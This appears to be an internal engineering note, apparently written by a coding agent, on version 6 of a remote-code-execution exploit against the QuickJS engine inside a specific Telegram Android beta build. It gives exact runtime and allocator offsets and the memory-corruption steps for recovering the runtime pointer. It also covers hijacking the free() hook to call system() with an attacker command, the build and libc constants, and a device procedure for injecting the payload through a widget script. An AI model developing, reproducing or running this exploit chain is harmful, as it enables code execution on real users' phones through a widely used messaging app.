# PR #1827 class-64 — universal v6: reliable main-context (rt) selection

> Superseded for app-build independence by `notes/universal_ctx_v7.md`
> (2026-11-05): v7 removes `JS_DEF_FREE`/`FREE_GOT` and decodes the app
> PLT/GOT at runtime. The arena/context design below is unchanged.

Date: 2026-11-02. Target: Telegram Android beta 72799, arm64, quickjs with the
64 KiB mmap-group arena. Scope of this note: **host/lab only** — the Sony was
not touched; the device procedure is for the caller.

Supersedes the ctx step of `notes/regexp1827_class64_v3_device_fix.md`.
The class-64 `byte_length` primitive, the fake libregexp program and the
`rt->mf.js_free = system` endgame are unchanged.

---

## 0. Device symptoms, restated from the captures

v3-style payloads on the Sony reach:

```
VIEWS=8 | DBG view0 k=3312 cls=29 D=0x76c994f498 | ...
DBG shape=0x77a23afe78 proto=0x77ac02d268 prop=0x77ac02d2b0
CTX | DBG ctx=0x78c97cd8d8 | DBG rt=0x78d9488080 free=0x773658936c
DBG libcfree=0x7af2db7f70 ... DBG sys=0x7af2dded60 cmd=0x76c994f498
HOOKED | AFTER
```

`AFTER` without a proof file is **not** success (the app also stays alive).
Two independent defects are visible in this trace; v3 addresses neither:

1. **No deterministic trigger.** v3 stores `BIG` in
   `globalThis.R1827_KEEP = [..., BIG]` and then does `BIG = null`. The array
   keeps the 4 KiB `Uint8Array` alive, so that assignment frees nothing
   (`BIG = null` is a refcount 2 -> 1). The lab proof appears only because the
   IIFE return frees incidental >512 B blocks (function bytecodes / local
   arrays) through `js_free_rt`. If the engine keeps the compiled script or
   the eval result alive, no large free ever reaches the hooked runtime while
   the widget is alive. v6 adds a *fresh* 4 KiB `TRIG` that is never put in
   `R1827_KEEP`: `TRIG = null` frees a >512 B block immediately after the two
   `rt` writes.

2. **D (and therefore `cmdAddr`) and/or `rt` can come from a stale view.**
   The scan matches a class-29/30 JSObject by class id and corrupted count.
   A JSObject left in a freed/recycled class-80 block still matches, and its
   `u.ptr` need not be the current victim's data. v3 used that value as the
   fast-path base and as `cmdAddr`; it also followed the stale object's
   `shape -> proto -> prop -> ctor -> realm` chain, which can land in a
   different or dead JSRuntime. v6 makes the view identity and the runtime
   independently verifiable (below).

The shipped `free = base + 0x173e36c` is the **default** `js_def_free` of the
72799 build, not a signature of a validator runtime: both the widget sandbox
and any other `JS_NewRuntime` use it. It therefore cannot be used to decide
whether the recovered rt is the executing one. The arena source in v6 can.

### Binary used for the offsets (important)

`/tmp/opencode/libtm/lib/arm64-v8a/libtmessages.49.so` is **not** the 72799
build from the APK:

```
base72799.apk /lib/arm64-v8a/libtmessages.49.so  sha256 1b756d81fdf07bce...
/tmp/opencode/libtm/lib/arm64-v8a/libtmessages.49.so sha256 7d54541a7d03104c...
```

The 72799 IDB is `/tmp/opencode/tg49_72799.so.i64` (its .so matches the APK).
All offsets below are re-derived from that IDB. Mixing the two builds gives
wrong struct offsets (they differ by ~0x280 in places).

---

## 1. 72799 allocator / runtime layout (from the correct IDB)

### JSRuntime (calloc 0x5F8)

```
+0x00  JSMallocFunctions mf: calloc, malloc, free, realloc, usable_size
       (+0x00, +0x08, +0x10, +0x18, +0x20)
+0x28  malloc_state: count +0x28, size +0x30, limit +0x38, opaque +0x40
+0x48  arena_list[31]          (list_head, 16 B each)
+0x238 free_arena_list[31]
+0x428 JSArenaGroup list head  (next +0x428, prev +0x430)
+0x440 zero-size block header
+0x498 context_list head
```

`rt->mf.js_free = rt+0x10`, `rt->malloc_state.opaque = rt+0x40`.
`js_free_rt` for a >512 B block calls `mf.free(opaque, header)`.
`JSContext.rt = ctx+0x10`; `JSContext.link = ctx+0` (list node at offset 0).

### JSArena (a 4 KiB sub-arena of a 64 KiB mmap group)

```
+0x00 free_link      +0x10 link
+0x20 group*         (JSArenaGroup)
+0x28 block_size_idx (u8)
+0x2a n_used_blocks  (u16)
+0x2c n_blocks       (u16)
+0x2e first_free_block (u16)
+0x30 block headers  (8 B each: block_idx u16 +0, block_size_idx u8 +2)
+0x38 first user byte of block 0
```

`n_blocks = 0xFD0 / block_size` -> 50 for the 80-byte class, 63 for 64 B.
The arena base from a user pointer is exactly the formula used by
`js_free_rt` in the binary:

```
B = D - 8 - block_size*bidx - 0x30      (D = user data, bidx = block_idx)
  = D - 56 - 80*bidx for class 80
```

### JSArenaGroup (32 B, `mf.malloc(32)`, NOT from the JS arena)

```
+0x00 next  -> rt+0x428 while the group is in use   <-- O(1) runtime leak
+0x08 prev
+0x10 mmap base of the 64 KiB region (page-aligned)
+0x18 bitmap (two u16: in-use and madvised)
```

Every in-use group is linked at `rt+0x428/0x430`, and its `+0` is the head
address `rt+0x428`. Therefore

```
rt = *(group) - 0x428
```

with no arena-list traversal. This is the primary device source in v6.
(When all sub-arenas of a group become empty, the group is removed, cached
at `rt+0x438` or munmapped; a group containing our live victim cannot be in
that state.)

### Geometry consequence for the scan

For an 80-byte block, the arena header word (block_size_idx/n_used/n_blocks/
first_free) is at `H = D - 16 - 80*bidx` in **both** the device layout and
the lab quickjs-ng 7a23d8e layout; only the arena base differs by 8:

```
device: B = H - 40, group* at H-8, block headers at B+48
lab:    B = H - 32, link.prev at H-8, block headers at B+40
```

The two are told apart by `g = [H-8]`:
- device: `g` is a group pointer; `[g+0x10]` is a page-aligned mmap base and
  `H-40` lies inside `[base, base+0x10000)` on a 4 KiB boundary;
- lab: `g` is `link.prev` (an arena link or the list head), whose `+0x10` is
  a packed small header, not a page-aligned mmap base.

The device branch takes the O(1) group back-pointer; the lab branch walks
`arena_list` to its head (`rt+0x48+16*8`) and computes `rt = head - 0xC8`.
The lab stress needs up to ~500 list steps, so the walk limit is 4096 (64 was
too small and produced `NO_HEAD`).

---

## 2. v6 payload (what changed)

`lab/regexp1827_class64/v6_template.js` + `gen_v6.py`.

### 2.1 Per-run nonce in the corrupted byte_length

```
K   = (Math.random()*2^23) ^ (Date.now() & 0x7fffff)     (23 bits)
BN  = 0x7a000000 + 8*K
write j: byte_length = BN + 8*j        (8-aligned, < 0x7e000000)
```

`elem_j = byte_length/8 = 0x0f400000 + K + j`. A view left by an earlier run
has a different K (different session time/random), so it fails the
`count == elem` scan filter before any pointer is dereferenced. Even if the
sandbox stubs `Math.random`, `Date.now()` advances between sessions.

### 2.2 Magic buffer check (view identity)

A random 64-bit `MAG` is written through the *current* victim's own
`Uint8Array` at offset 0. For every scan candidate, the payload reads the
candidate's `u.ptr`, pivots that view to the candidate address and reads 8
bytes there. Only a view whose `u.ptr` is this victim's data block returns
`MAG`. A stale view with an old `u.ptr` is rejected (`stale=n`), so D and
`cmdAddr` can never be a foreign buffer. The magic is overwritten by the
command later.

### 2.3 Runtime from the arena that owns D (primary)

```
hdr = [D-8]        bidx = hdr & 0xffff, bsi = (hdr>>16)&0xff
require bsi == 8, bidx < 64
H = D - 16 - 80*bidx
hq = [H]           require low byte 8, 10 <= n_blocks <= 63, bidx < n_blocks
g = [H-8]
device if [g+0x10] is a page-aligned 64 KiB base containing H-40:
    gl = [g]        ( = rt+0x428 while in use)
    rt = gl - 0x428; require 16-aligned and looksLikeRt(rt)
else lab:
    B = H-32; walk link list from B+16 to the head; rt = head - 0xC8
```

`looksLikeRt(rt)` requires `rt->mf.free`, `realloc` and `usable_size` to be
code pointers (this is true of every `JS_NewRuntime`, which is exactly what
the widget sandbox uses; it is a sanity check, not a "main vs validator"
discriminator — the arena ownership is the discriminator).

### 2.4 Prototype chain — optional cross-check, never first

The arena walk runs **first** and its `DBG arena ...` line is emitted before
any JSObject/JSShape pointer is dereferenced. Only then does the optional v3
chain run (`CFG.CTXCHK`):

- quiet device payloads: `CTXCHK=0` — the prototype chain is not executed at
  all; the runtime comes from the arena or the payload reports `NO_RT`. This
  keeps a stale/unmapped `shape` pointer from killing the run before the
  hook.
- `device_payload_v6_universal_dbg.js`: `CTXCHK=1` — the chain is executed
  for diagnosis **after** the arena result is known. If the chain crashes on
  a stale shape, the `DBG arena` line has already been printed and the quiet
  payload (arena-only) can still be used.

`SRC` values:
- `SRC=BOTH`     arena rt == ctx->rt (best; the chain was current)
- `SRC=ARENA`    arena rt valid, ctx chain failed or `CTXCHK=0`
- `SRC=ARENA_MM` arena rt valid, ctx->rt is a *different* runtime (the old
                 device failure, now visible)
- `SRC=CTX`      arena walk failed; old fallback, only with `CTXCHK=1`.
                 **Inconclusive**, see §5. The quiet payload never takes
                 this path.

### 2.5 Trigger

`var TRIG = new Uint8Array(4096)` is allocated at the start and never stored
in `R1827_KEEP`. After `rt->mf.js_free = system` and
`rt->malloc_state.opaque = cmdAddr`, `TRIG = null` frees a >512 B block
synchronously: `js_free_rt -> mf.js_free(opaque, block) -> system(cmd)`.
No allocation and no GC runs between the two writes and this free. A crash
after the proof is acceptable; the file is written first.

`cmdAddr` is the untagged `D & 0x00ffffffffffffff` (TBI-safe).

---

## 3. Lab evidence (`evidence_v6_lab.txt`)

Build: `lab/regexp1827_arena/build/lab_regexp_rel` (quickjs-ng 7a23d8e +
forced arena), lab constants `JS_DEF_FREE=0x146e0`, `FREE_GOT=0x11afb0`,
`SYSTEM_DELTA=-0x4ff30`, proof `/tmp/opencode/regexp_arena/rce_proof_class64`.

| test | payload | result |
|---|---|---|
| normal, 5x | `lab_v6.js` | 5/5 proof, `VIEWS=8 RT=BOTH` |
| arena-only (quiet device path), 5x | `lab_v6_arenaonly.js` | 5/5 proof, `RT=ARENA`, no ctx chain executed |
| universal ELF resolver, 3x | `lab_v6_resolve.js` | 3/3 proof (`RESOLVE=1` path used by the device universal payload) |
| **poison shape**, 5x | `lab_v6_poison.js` | 5/5 proof, `RT=ARENA` — proves the arena source alone is sufficient |
| poison, arena off | `lab_v6_poison_ctxonly.js` | 0/1, `NO_RT NO_SHAPE` — control for the old dependency |
| fragmentation, 5 configs | `gen_stress_v6.py` | 5/5 proof, `RT=BOTH` (walk needed up to 483 steps) |
| two runtimes, recycled pages, 5x | dry `lab_dual_v6_dry.js` + `lab_dual_v6.js` | 5/5 proof, `VIEWS=7 RT=BOTH` (one stale candidate filtered) |
| same, nonce off, 5x | dry `lab_dual_v3compat_dry.js` + `lab_dual_v6_nonce0.js` | 5/5 proof — magic+arena also work when counts collide |
| same, poison shape, 5x | dry `lab_dual_v6_dry.js` + `lab_dual_v6_poison.js` | 5/5 proof, `RT=ARENA` |
| device-layout unit test | `lab_arena_dev_v6.js` + `lab_devtest` | 2/2 — synthetic 64 KiB group / 4 KiB sub-arena, one- and two-sub-arena lists, O(1) and list-walk both find the fake rt |

The unit test constructs the exact 72799 structures from §1 (group* at +32,
header at +40, blocks at +48, block header user at +8, `rt+0x428` group head,
mf code pointers, 6 MiB limit) and runs the same walk code as the payload
through a `__peek64` primitive. It is the only lab test of the device branch;
the O(1) `rt = [group] - 0x428` path is validated there.

### Build/constant coupling (lab)

`lab_v6.js` and the stress payloads are tied to the checked-in
`build/lab_regexp_rel` (`JS_DEF_FREE=0x146e0`, `FREE_GOT=0x11afb0`). Any edit
to `lab_regexp.c`/the engine changes the final PIE layout and therefore those
two offsets; re-derive them with `nm`/`objdump -R` before rebuilding. This is
exactly what bit the dual harness: its extra code moved `js_def_free` from
`0x146e0` to `0x14a20` and `free@GOT` from `0x11afb0` to `0x11af90`, which is
why `lab_dual_*` payloads carry their own constants.

### Dual-harness note

`lab_dual.c` is a copy of `lab_regexp.c` extended with `DUAL_DRY=<dry.js>`
and `DUAL_NOFREE=1` (run a dry script in runtime V, free V, then run the full
script in runtime M, exit without freeing the hooked M). `lab_regexp.c`
itself is unchanged, so `build/lab_regexp_rel` keeps the standard offsets.
Adding code to the dual source shifts the final PIE layout, so the dual
harness has its **own** constants: `JS_DEF_FREE=0x14a20`, `FREE_GOT=0x11af90` (payloads
`lab_dual_*.js`, generator `gen_v6.py` kind `labdual`). Do not run
`lab_v6.js` under `lab_dual`; it resolves `system` from the wrong base.

The dual harness cannot reproduce the exact device "dead/foreign realm"
state: glibc reuses the freed runtime/context blocks for M, so the stale
chain often lands back on M. What it does validate is that v6 still works
when the class-80 pages contain a previous session's view objects, including
when their counts collide (nonce off) and when their shape pointers are
deliberately poisoned.

Dead end (do not retry): prepending 0/500/2000/6000 live `{}` "bundle"
objects to the full run (`lab_dual_*_b*.js`) still let the v3compat payload
(`NONCE=0 MAGIC=0 ARENA=0`) resolve `RT=CTX` to M and write the proof. The
current runtime's context init re-uses V's freed shape blocks before the
payload, so the stale realm is M's realm. This is exactly why a lab
v3compat success is **not** evidence that v3 works on the device, and why
the device payload must report `DBG arena`/`SRC`.

---

## 4. Device payloads (72799)

All under `lab/regexp1827_class64/`:

| file | purpose |
|---|---|
| `device_payload_v6_universal_dbg.js` | **run this first**; runtime ELF64 resolver, DBG=1, CTXCHK=1 |
| `device_payload_v6_universal.js` | runtime resolver, quiet, CTXCHK=0 |
| `device_payload_v6_72799.js` | fixed `system-free=0x26df0`, quiet, CTXCHK=0 |
| `device_payload_v6_72799_f8000.js` | FILL64=8000 fallback if `VIEWS=0`, quiet, CTXCHK=0 |

Constants (verified against the APK's 72799 .so):

```
JS_DEF_FREE = 0x173e36c   (js_def_free: MOV X0,X1; B free)
FREE_GOT    = 0x1964cc0   (free@LIBC JUMP_SLOT)
SYSTEM_DELTA= 0x26df0     (Sony A13 libc system-free)
CMD = id > /data/user/0/org.telegram.messenger.beta/cache/rce_proof
FILL64=4000 FILL80=400 NV=32 NW=8 LIM=8192
```

The universal variant resolves `system` from the leaked `mf.free` (PIE base +
`FREE_GOT` -> libc `free` -> ELF64 dynamic symbol lookup). Sony and Pixel run
the same app build 72799, so the JSRuntime/arena offsets (including the
`rt+0x428` group back-pointer) are identical; only libc's `system-free`
differs, and the resolver removes that difference. The fixed-delta payload
keeps the Sony value `0x26df0` as a fallback.

### Procedure (caller)

1. Inject one payload as a single synchronous widget script (same path as the
   v3 payloads; 8 MiB JS limit, no timers). Start with
   `device_payload_v6_universal_dbg.js`. If that crashes after printing
   `DBG arena ...` but before `HOOKED`, the optional ctx cross-check hit a
   stale shape; re-run `device_payload_v6_universal.js`, which skips it.
2. Read the `R1827:` lines and `globalThis.RESULT`. The DBG payload shows
   the full shape below; the quiet payload prints only `VIEWS`, `RT`, `HOOKED`,
   `AFTER` (and errors), because it skips the prototype chain:
   ```
   NONCE=0x.... MAG=0x....
   VIEWS=8 [stale=n]
   DBG view0 k=... cls=.. D=0x...
   DBG arena g0 nb=50 bidx=.. rt=0x...     (device O(1) path)
   DBG ctx=0x... rtC=0x...
   DBG RT src=BOTH rt=0x...
   RT=BOTH
   DBG sys=0x... free=0x...
   DBG cmd=0x...
   HOOKED
   AFTER
   ```
3. Check the proof **before** trusting `AFTER`:
   ```
   adb shell run-as org.telegram.messenger.beta cat cache/rce_proof
   ```
   Success is `uid=10357(...)` (the app UID) with the command output.
   A crash after `AFTER`/`HOOKED` is acceptable; the proof is written by
   `system()` at the `TRIG` free.

### Marker decisions

| marker | meaning / action |
|---|---|
| `VIEWS=0` | no corrupted victim produced a usable view. Try `_f8000`; if the app crashed during the replace, the class-64 list is larger than FILL64. |
| `NO_VIEWS stale=n` | candidates existed but all failed the magic (all stale). Re-run (new nonce) or `_f8000`. |
| `DBG arena g0 ...` | device O(1) group source succeeded. |
| `DBG arena lay=... steps=...` | O(1) failed, list walk used (device fallback). `steps` should be < 4096. |
| `NO_ARENA_HDR` | D-8 is not an 80-byte block header (D is not a class-80 user pointer). |
| `NO_ARENA` | arena header word did not validate (layout/IDX issue). |
| `NO_HEAD`/`CYCLE`/`BAD_RT` | list walk failed; report the `DBG arena` line. |
| `RT=BOTH` | arena and prototype chain agree — best case. |
| `RT=ARENA` | arena rt valid, chain failed (dead/poisoned shape) — still trustworthy. |
| `RT=ARENA_MM` | **the old bug reproduced**: ctx->rt was a different runtime; arena rt was used. Report both addresses. |
| `RT=CTX` | DBG payload only: arena walk failed and the payload fell back to the old chain. **Inconclusive**: do not count `AFTER` as success; report the `DBG arena` error. The quiet payload reports `NO_RT` in this case. |
| `NO_RT` | neither source. Report the two errors printed with it. |
| `NO_FREE` | chosen rt's `mf.free` is not a code pointer (wrong rt / wrong build). |
| `NO_SYS` | ELF resolver failed (libc layout); try the fixed-delta build (Sony). |
| `HOOKED` / `AFTER` | rt fields written / trigger returned. Check the proof file. |

If the plain quiet payload reaches `RT=BOTH/ARENA`, `HOOKED`, `AFTER` but the
proof is missing, re-run the `_dbg` variant and report `DBG arena`, `DBG RT`,
`DBG sys`, `DBG cmd`, and the proof command's exit code. `AFTER` is not proof.

---

## 5. Risks and open items (be critical)

1. **Device branch not executed on hardware yet.** The 72799 group/sub-arena
   layout is from the correct IDB and is exercised by the synthetic unit test,
   but the first on-device `DBG arena g0 ...` line is the real validation.
   If it prints `lay=... steps=...` instead, the O(1) path was rejected and
   the list walk is carrying; report the line.
2. **`g0` offset is 72799-specific.** The group list head at `rt+0x428` and
   `rt = [group] - 0x428` must be re-derived for another build. The payload
   validates the candidate with `looksLikeRt` and falls back to the list walk,
   so a wrong offset should not corrupt memory, but it also will not help.
3. **`RT=CTX` is not a fix.** It is the v3 behaviour and is only reachable in
   the DBG payload (`CTXCHK=1`). If the arena walk fails on device, the run is
   inconclusive; do not report a success without the proof file. The quiet
   payload deliberately refuses to hook a ctx-derived runtime (`NO_RT`).
4. **Nonce uniqueness.** `Math.random()` is per-context (seeded by
   `JS_NewContext` with microseconds) and `Date.now()` is mixed in; a
   same-microsecond duplicate is the only collision path. Magic + arena still
   protect D/rt on a collision; the nonce mainly avoids dereferencing stale
   `u.ptr` values.
5. **CPU budget.** The device O(1) path is a handful of reads. The lab walk
   fallback can be ~500 steps under fragmentation; the 4096 limit is a safety
   net, not a target. If the device reports `lay=... steps=` in the hundreds
   and the widget is interrupted, treat it as a grooming/layout issue.
6. **Class-80 chain/geometry.** v6 still needs a forward pad view within
   `LIM=8192` (`VIEWS>=1`); `_f8000` remains the knob if the drain is short.
7. **The trigger is now deterministic but destructive.** After `TRIG = null`,
   `rt->mf.free` is `system` and `opaque` is the command pointer until the
   runtime dies. Any later >512 B free calls `system(cmd)` again. This is
   intended; the app may crash at teardown after the proof is written.

---

## 6. Files

```
lab/regexp1827_class64/
  v6_template.js                    v6 source template (@@PLACEHOLDER@@)
  gen_v6.py                         emitters (lab / labdual / dev)
  gen_stress_v6.py                  fragmentation stress emitter
  lab_v6.js  lab_v6_dbg.js  lab_v6_dry.js
  lab_v6_nonce0.js  lab_v6_poison.js  lab_v6_poison_ctxonly.js
  lab_v6_arenaonly.js                CTXCHK=0 (quiet device path)
  lab_v6_resolve.js                  RESOLVE=1 (universal resolver path)
  lab_dual_v6.js  lab_dual_v6_dbg.js  lab_dual_v6_dry.js
  lab_dual_v6_nonce0.js  lab_dual_v6_poison.js
  lab_dual_v3compat.js  lab_dual_v3compat_dry.js
  lab_arena_dev_v6.js               unit test of the device layout
  device_payload_v6_universal.js
  device_payload_v6_universal_dbg.js
  device_payload_v6_72799.js
  device_payload_v6_72799_f8000.js
  evidence_v6_lab.txt               matrix log (§3)
  run_v6_evidence.sh                reproduces evidence_v6_lab.txt

lab/regexp1827_arena/
  lab_devtest.c                     synthetic 72799 allocator + __peek64
  lab_dual.c                        dual-runtime harness source
                                    (DUAL_DRY / DUAL_NOFREE / DUAL_PAD)
  build/lab_dual                    dual-runtime harness (dual constants!)
  lab_regexp.c                      unchanged standard harness source
  build/lab_devtest                 device-layout unit test
```
